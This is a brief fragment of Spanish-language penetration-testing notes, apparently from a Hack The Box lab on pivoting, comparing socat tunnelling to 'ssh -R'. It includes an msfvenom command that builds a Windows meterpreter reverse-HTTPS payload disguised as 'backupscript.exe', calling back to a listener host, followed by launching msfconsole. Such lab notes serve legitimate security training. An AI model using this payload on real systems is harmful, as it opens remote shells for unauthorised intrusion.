...
- *Nota: Básicamente, los mismo que ssh -R pero con Socat.*
______
...
```shell-session
D4rsel@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
...
```shell-session
D4rsel@htb[/htb]$ sudo msfconsole
